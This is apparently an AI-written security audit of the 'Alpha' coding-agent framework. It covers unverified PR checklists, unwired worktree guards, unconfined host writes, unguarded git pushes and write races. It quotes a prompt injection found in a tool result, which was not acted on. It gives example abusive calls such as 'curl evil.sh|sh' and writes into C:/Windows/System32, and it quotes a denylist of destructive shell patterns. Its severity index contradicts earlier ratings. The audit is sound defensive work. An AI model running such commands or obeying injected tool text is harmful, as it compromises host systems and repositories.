# ALPHA AI — AUDIT REPORT, PART IV: GIT / CODING AGENT + SYNTHESIS

Companion to Parts I–III. **5 of 6 deep-dives complete.**

> **Note on untrusted input:** the Git deep-dive's tool result ended with injected
> text instructing the assistant to write a `MEMORY.md` file and open a new session.
> That did not come from the operator — it arrived inside a tool result, i.e. exactly
> the untrusted-content channel this audit spent a section measuring (F-54, F-56). It
> was **not** acted on. Recording it here as a live demonstration of the risk.

---

# 1. GIT / CODING AGENT — five CRITICAL findings

## 1.1 F-63 · CRITICAL · A PR body that certifies tests it never ran · HIGH

**This is the most damaging finding in the entire audit**, and not because of what it
breaks — because of what it says about the project.

`backend/packages/harness/alpha/projects/pr_synthesizer.py:147-149`:

```python
lines.append("- [x] Static AST & secret scanning passed (Audit Council)")
lines.append("- [x] Automated unit and regression test suite passed")
lines.append("- [x] Pre-merge contract obligations certified")
```

I verified line 148 directly: **`synthesize_pr` contains no `subprocess`, no `pytest`,
no `npm test`, and no test invocation of any kind.** It is a Markdown generator. The
second checkbox asserts that an automated test suite passed, unconditionally, having
run nothing.

This is precisely what the project's own root `AGENTS.md` calls non-negotiable:

> *"claim honesty is mandatory … and a completed run is never 'verified'."*

And the first checkbox asserts the Audit Council passed — while
`projects/audit_council.py:102-106` is a **dict literal**:

```python
signatures = {"reviewer": True, "security": True, "architect": True}
```

with two of the three flipped to `False` only by three hardcoded `re.search` patterns
(`SECRET_PATTERNS`, `UNSAFE_PATTERNS`, one SQLite/Postgres check — `:110-142`).
"Reviewer" and "Architect" are **not agents**. Nothing reviews a diff.

**Impact:** the subsystem whose entire purpose is to produce a trustworthy reviewable
artifact is the one place in the codebase that fabricates verification. Anyone reading
a synthesized PR body is reading three unchecked claims.

**Fix:** make each line conditional on a real signal, and render `- [ ] … not run`
when no evidence exists. `audit_council` should be renamed to what it is (a regex
linter) or given a real reviewer.

## 1.2 F-64 · CRITICAL · The worktree and PR libraries are complete, hardened, and unreachable

`sandbox/worktrees.py` is **338 lines of genuinely excellent code**:

- `_target_path` (`:72-80`) regex-validates the branch, hashes it, and re-checks
  `target.resolve().is_relative_to(self.worktrees_dir)`.
- `_verify_worktree` (`:112-126`) re-derives `--show-toplevel`, `symbolic-ref HEAD`
  **and** `--git-common-dir` and compares all three — defending against a planted
  directory masquerading as a worktree.
- `create_worktree` (`:128-151`) uses `--end-of-options` + `^{commit}` peel so a ref
  cannot be read as an option.
- `remove_worktree` (`:255-292`) **refuses to delete a tree holding uncommitted or
  untracked work** unless `discard_uncommitted=True`.
- Every git call runs with `GIT_*` stripped from the environment (`:98`).

`merge_simulation.py` is likewise explicit that `CLEAN != verified` (`:24-25, 88-93`).

**None of it is reachable from an agent.** No `@tool`, no Gateway route, no production
caller. The one real production use is `swarm/worker.py:397-447`, and it is not the
target architecture:

```python
system_prompt = ("... Output ONLY a unified diff (--- a/... +++ b/... hunks) ...")
diff_text, usage = _deliver_objective(...)
worktree = self.manager.create_worktree(branch_name=self.branch_name)
patch_file = Path(worktree.path) / f"{task.task_id}.patch"
patch_file.write_text(diff_text, encoding="utf-8")
```

The model emits a diff **as text**; Alpha drops that text as a `.patch` file and
**never applies it**. The worktree is created, one file written, never cleaned up.

Against the target model:

| Step | Status |
|---|---|
| main protected | **ABSENT** (§1.4) |
| isolated worktree per agent | **LIBRARY EXISTS, NEVER WIRED** |
| agent implements + tests | **IMPLEMENTED** (two ways) |
| agent **commits** | **NOT IMPLEMENTED** — no `git commit` anywhere. `manage_code_checkpoint` only writes `refs/alpha-checkpoints/<id>` pointing at existing HEAD (`code_agentic_core.py:358`) |
| agent raises PR | **SIMULATION ONLY** — a JSON file. The *prompts* tell the LLM to call `gh pr create` itself (`github/prompts.py:185-189`) |
| maintainer reviews + merges | **ABSENT** — no merge code exists anywhere |

**A human opens the PR and a human merges it.** Alpha may open the PR if the model
chooses to.

## 1.3 F-65 · CRITICAL · `manage_code_checkpoint` rollback writes arbitrary host files

`code_agentic_core.py:311-380, 400-424, 531-567`. `rollback_to_checkpoint` and
`create_shadow_checkpoint` take a **model-supplied `root_path`** and write to it with
**zero path validation**, no sandbox, and no authz gate — unlike `write_file`, which is
correctly confined. `_ACTIVE_CHECKPOINTS` is a **process-local, unbounded, non-persisted
`dict`** shared across all threads and users.

```
manage_code_checkpoint(action="rollback", root_path="C:/Windows/System32", target_files=[...])
```

writes as the Gateway user. The tool is in `BUILTIN_TOOLS` (`tools.py:265`).

Two further problems on the primary write path:
- **No diff preview, no confirmation, no automatic backup.** `write_file` truncates
  (`local_sandbox.py:901-903`); `str_replace` rewrites the whole file
  (`tools.py:2708-2723`). A mid-write failure loses prior content irrecoverably.
- The only pre-write gates are a *staleness* check
  (`ReadBeforeWriteMiddleware` — "blocked unless the newest read mark matches the
  current hash", not a consent gate) and a `.py`/`.json`/`.yaml` parse check
  (`ast_syntax_guard.py:48-63`) that silently passes every other extension.

**And `auto_test_and_repair` has the same defect** (`code_agentic_core.py:195-288`):
`subprocess.run(cmd, shell=True, cwd=root)` with a **model-supplied `test_command` and
`root_path`**, no sandbox, no authz. `auto_test_and_repair(test_command="curl evil.sh|sh",
root_path="C:/")` runs on the host. Its 60 s default timeout is model-overridable with
no upper bound — but that only bounds *this* tool; a hung suite via `bash` pins the
agent for `bash_command_timeout` = **600 s** with no model-lowerable override.

## 1.4 F-66 · CRITICAL · Nothing prevents `git push main` or `--force`

Three protections exist and **none is on the agent path**:

1. `sandbox/worktree_strategy.py:133` `_PROTECTED_BRANCHES = {"main","master","trunk","develop","release"}` — **UNVERIFIED** whether anything calls it.
2. `rsi/workspace.py:110-120` `_validate_branch_name` requires an `rsi/` prefix, **mechanically, before any git call** — for the RSI path only. Admirably honest, and narrow.
3. `safety/self_repo_guard.py:20-23` blocks mutating git subcommands when cwd is inside
   the **Alpha install** (except under `.worktrees`) — it protects Alpha, not the target repo.

The only reachable git path is `bash` (`sandbox/tools.py:2049`).
`validate_local_bash_command_paths` checks **paths, not git semantics**.
`SandboxAuditMiddleware`'s patterns (`:50-70`) cover `rm -rf`, `dd`, `mkfs`, `| sh`,
`eval $(curl …)`, `> /usr/bin/` — **no `git push`, no force-push**.

And the GitHub App **installation token is injected into `bash`** as
`GH_TOKEN`/`GITHUB_TOKEN` (`tools.py:1975-2017`, `:2080`). Its permissions are
**entirely the GitHub App's** — nothing in Alpha scopes or constrains them.
`mask_secret_values` redacts it from *output* but not from the process's ability to
*use* it. If the App can merge, `gh pr merge` succeeds.

**Failure:** an agent — or an injection through a fetched URL — force-pushes to the
default branch. Irreversible history loss, with no control point in Alpha. Branch
protection, if it exists, is GitHub-side and Alpha never reads it.

## 1.5 F-67 · CRITICAL · Concurrent subagents silently lose each other's writes

The workspace is **one shared per-thread directory**:
`thread_data_middleware.py` creates `…/threads/{thread_id}/user-data/workspace`, and
`subagents/executor.py:1360-1363` passes the **parent's** `thread_data` straight into
every child. No worktree is involved anywhere in the `bash`/`write_file`/`str_replace`
path.

What protects it: `sandbox/file_operation_lock.py:20-27` keys on `(sandbox_id, path)`.
For the local sandbox `id` is `local:{user_id}:{thread_id}` — so **all subagents in a
thread share one lock table**. Same-path writes are serialized.

**But serialization is not conflict detection.** The read mark lives in
`state["messages"]` of each subagent's *own* graph
(`read_before_write_middleware.py:9-11`) — there is **no shared version counter and no
CAS on the file**. Two agents both read v1, both pass their own read-before-write gate,
both write. The lock makes them sequential; **the second still overwrites the first,
and both report success.**

`projects/locks.py` provides TTL'd file/dir/task locks with a conflict API, exposed at
`routers/projects.py:576-663` — but they are **advisory**: nothing in `write_file`,
`str_replace`, `hashline_edit`, or `bash` ever calls `get_lock_manager()`. A cooperative
lock the writers ignore.

The lock is also **process-local** (`threading.Lock` in a module-global
`WeakValueDictionary`): under `GATEWAY_WORKERS > 1` there is zero cross-process
coordination.

**Impact: nondeterministic data loss with a success receipt on both sides.** Two
subagents edit `app.py`; A's change vanishes and A reports it succeeded.

## 1.6 F-68 · MEDIUM · Provenance stops at the run

`workspace_changes/` snapshots a run's file set with `sha256_before/after` and diffs,
persisted as a `workspace_changes` run event and served at
`GET /runs/{rid}/workspace-changes` — real, and ties changes to a **run id**. But:

- **No per-file authorship** — no agent name, task id, or prompt hash in a header, a
  git trailer, or a sidecar.
- **No commit anywhere**, so there is no author line to read.
- One run contains many subagents editing many files, so "which agent wrote this line"
  means replaying a run and heuristically matching receipts to paths.

## 1.7 F-69 · MEDIUM · The Windows sandbox is a path prefix, not a boundary

`LocalSandbox` is a `subprocess.run([shell, "-c", …])` wrapper.
`persistent_shell_sessions = False`; every call is a fresh process. On Windows there is
**no Job Object**, no `CREATE_SUSPENDED`, no `AssignProcessToJobObject` — cleanup is
best-effort with a `process.wait(timeout=10)` warning as the failure mode
(`local_sandbox.py:768-789`), so orphaned test runners are possible. POSIX uses
`start_new_session` + `killpg`.

`env_policy.py:24-96` scrubbing is **thorough and thoughtful** — `*KEY*/*SECRET*/*TOKEN*/
*PASS*/*CREDENTIAL*/*DSN*` plus exact names including `DATABASE_URL`, `GH_PAT`,
`GITHUB_PAT`, and `SSH_AUTH_SOCK` (scrubbed specifically to stop a subprocess signing as
the host user — a genuinely subtle distinction most projects miss).

The consequence to state plainly: **on Windows, once `allow_host_bash: true` is set —
which is exactly the configuration required to let the agent run `git` — there is no
boundary between "the agent" and "the Gateway user's account."** Combined with F-53
(`python_repl` already defeats that switch) and F-66 (no push guard), the Git workflow
the target architecture assumes is the one configuration where every other control is
off.

---

# 2. SYNTHESIS — the final answer

## 2.1 What Alpha genuinely is

Not "a UI around an LLM." It has a **real, bounded, cost-controlled agent loop**; a
**genuinely correct subagent runtime** with own prompt/tools/model/memory/loop and three
independent caps; a **correct run lifecycle** with database-fenced dual-execution
prevention and fail-closed `UNKNOWN` side-effect accounting; **layered, correct path
traversal defence**; **default-deny egress**; and an **unusually strong honesty-in-code
culture** that self-reports its own dead code in a machine-checked allowlist.

## 2.2 The single sentence

**Alpha has built the parts of an autonomous agent operating system and, with a small
number of exceptions, has not connected them to the agent.**

Every CRITICAL finding in this audit has the same shape:

| Control built | The gap |
|---|---|
| `allow_host_bash: false` (F-53) | `python_repl` runs in-process with `os` preloaded |
| `<system-reminder>` trusted-tag denylist (F-54) | injected memory is exempt from the middleware enforcing it |
| `sandbox/worktrees.py`, 338 hardened lines (F-64) | no `@tool`, no route, no caller |
| `audit_council` "reviewer/architect" (F-63) | a dict literal and three regexes |
| `projects/locks.py` conflict API (F-65) | advisory; no writer consults it |
| `worktree_strategy._PROTECTED_BRANCHES` (F-66) | no caller on the `bash` path |
| `self_repo_guard` (F-66) | protects the Alpha install, not the target repo |
| `build_sandbox_env` scrubbing (F-59) | the REPL inherits `os.environ` verbatim |

This is not dishonesty. It is the far more common and more expensive failure of
**completion without wiring** — and it is invisible from the outside precisely *because*
the surrounding code is well documented, well tested, and self-aware. The docs read
like a finished system. The security posture reads like a defended one. In both cases
the artifact that would expose the gap is a test, a route, or an import that was never
written.

## 2.3 Brutal truth, answered directly

**What is Alpha genuinely good at today?**
Being a well-engineered, well-documented, well-tested *single-agent* chat-and-tools
application with a strong local story: subagent delegation, swarm scheduling, memory
with real provenance, a correct run lifecycle, and honest UI. The cost/DoS control is
better than most production agent frameworks.

**What is mostly superficial?**
Everything requiring an agent to *change the world*: git, PRs, code review, merging,
self-repair, self-improvement. Six CRITICAL findings, and the honest summary is that
**Alpha cannot yet act as a safe software-engineering agent.** It has the parts built
as good libraries; none is connected. `PRSynthesizer` even certifies a test suite it
never ran.

**What is most likely to break during long autonomous operation?**
Concurrent subagents silently overwriting each other (F-67), with a success receipt on
both sides. Then a resumed run re-announcing a side effect that already landed, because
the ledger brackets only MCP submits (F-32). Then a 2-hour outage becoming a task
failure because the retry budget is 15 seconds (F-34).

**Biggest architectural weakness?**
No ownership boundary between *harness capability* and *agent reachability*. 114
harness packages, and "is this reachable from a tool call?" is answered by nothing
systematically — it is answered by a maintainer noticing.

**Biggest reliability weakness?**
The evidence gap: observability is unreachable from config (F-44) and untraceable at
span level, so a production incident in a default deployment cannot be reconstructed.

**Biggest multi-agent weakness?**
Shared mutable workspace with no conflict detection (F-67), and a default swarm worker
that is a single `model.invoke()` with no tools (F-22).

**Biggest memory weakness?**
No trust tiering on read (F-41) plus unescaped injection into a framework-trusted
channel (F-54) — a durable, self-reinforcing poisoning path.

**Biggest security concern?**
`python_repl` (F-53). Reachable in the shipped default; defeats the operator's one
documented kill switch; yields full host code execution and mass credential disclosure.

**Biggest UX weakness?**
27 destinations with no URL state, no persistence, and no filter (F-02, F-03, F-04) —
plus a component layer with zero tests (F-06) whose entire bug history is wiring
defects.

**What should be redesigned rather than patched?**
The **reachability contract**. Not the subsystems — those are good. What is missing is
a machine-checked answer to "which of these 114 packages and 134 tools can an agent
actually invoke, under which config?" The repo already has the mechanism
(`test_no_orphan_modules.py`, `feature_manifest.json`, `capabilities/catalog.py`) and
uses it to prove things are *importable*. It needs the same rigor applied to
*reachable-from-a-tool-call*, with the config key that turns each on. That single
change would have caught F-53, F-64, F-66 and F-44 at review time.

**What must be fixed before "production-ready"?**
F-53 (one line of gating), F-64/F-66 (wire the worktree library; guard push), F-67
(per-agent worktree or a real CAS), F-63 (stop certifying unrun tests), F-41/F-54
(trust tiers + escaping), F-44 (make tracing reachable from config). Six items.

**What foundation should be established before adding more "AI features"?**
A behavioural evaluation harness. 26,933 tests and zero of them ask whether the agent
*works*. The project's signature strength — refusing to claim unearned verification —
is applied to the UI's honesty about the backend and **not at all** to the agent's own
competence. A system can be perfectly honest about a completely incompetent agent.

---

# 3. ROADMAP

## P0 — before any serious autonomous use

| # | Action | File |
|---|---|---|
| 1 | Gate `python_repl` on its own explicit switch; use `build_sandbox_env` in `_start_shell` | `tools/tools.py:178`, `sandbox/repl/session.py:177-201` |
| 2 | Delete the fabricated PR checklist; make every line evidence-conditional | `projects/pr_synthesizer.py:147-149` |
| 3 | Validate `root_path` in both code tools through the same confinement as `write_file` | `code_agentic_core.py:311-424, 531-567, 195-288` |
| 4 | Give each coding subagent its own worktree — wire the library that already exists | `sandbox/worktrees.py` → a `@tool` + route |
| 5 | Refuse `git push` to a protected branch and `--force` on the `bash` path | `sandbox/tools.py:2049` |
| 6 | Add a regression test that no tool is reachable while its mitigation is off | new, mirroring `_is_host_bash_tool` |
| 7 | Make `observability`/`trace` reachable from `config.yaml` | `config/app_config.py:258-509` |

## P1 — architectural

8. Refuse the main thread's HTTP → one `?view=` registry (F-02/F-03).
9. Real per-path CAS or a shared version counter for workspace writes (F-67).
10. Trust tiers on memory read; escape injected memory (F-41/F-54).
11. Wire the resume launcher to `NetworkWaitService` and separate outage budget from flap budget (F-34).
12. `run_events.backend` → `sqlite` in the shipped template (F-33).
13. Make Integration Health fail **loud** (F-45).
14. Replace `logger.debug` with `logger.warning` in the six memory paths, or teach the ratchet what "reported" means (F-46).

## P2 — engineering

15. Goal hierarchy in the run loop, or stop implying one (F-20).
16. Catching `GraphRecursionError` as `turn_capped` for the lead (F-19).
17. Live log rotation in the Gateway (F-49) and hot log level (F-50).
18. Component tests — 61 pure-logic suites and zero React tests is the wrong shape (F-06).
19. Delete `durable-runtime.md`'s false ledger claim (F-32).

## P3 — UX

20. Nav filter box; render the `category` grouping; surface Settings sooner (F-04).
21. Fix the remaining `<div onClick>` controls and the dead `BotDetailPanel` (F-09).

---

# 4. SEVERITY INDEX

| Sev | Count | IDs |
|---|---|---|
| **CRITICAL** | 9 | F-53, F-63, F-64, F-65, F-66, F-67, F-69, + shared-workspace race, + `auto_test_and_repair` escape |
| **HIGH** | 17 | F-01, F-02, F-06, F-08, F-09, F-11, F-16, F-20, F-22, F-23, F-32, F-41, F-42, F-44, F-45, F-48, F-54, F-55 |
| **MEDIUM** | ~22 | F-03–F-05, F-07, F-10, F-12–F-19, F-21, F-24–F-27, F-33–F-36, F-43, F-46, F-47, F-49, F-50, F-56–F-61, F-68 |
| **LOW / INFO** | ~20 | F-10, F-13, F-14, F-17, F-18, F-28–F-31, F-37, F-38, F-51, F-52, F-62 |

# 5. STILL OUTSTANDING

The **docs-vs-reality / dead-code** deep-dive has not returned. It was asked to verify
the "134 tools / 61 routers / 42 middlewares / 8 loops / 102 engines" claims against
`contracts/feature_manifest.json`, and to determine whether RSI, self-repair, council,
deliberation and MoA are operational. That is the last piece needed before the
documentation-vs-reality section (§21 of the requested format) can be written with
evidence rather than inference.

**UNVERIFIED and still owed** — each a repo-wide search the subagents could not run:
`pickle` / `eval(` / `exec(` sweep; the complete `announce_effect` call-site set; whether
`worktree_strategy._PROTECTED_BRANCHES` has any caller; whether
`observability/events.py::EVENT_NAMES` has a producer; `apply_logging_level` callers
outside the lifespan.
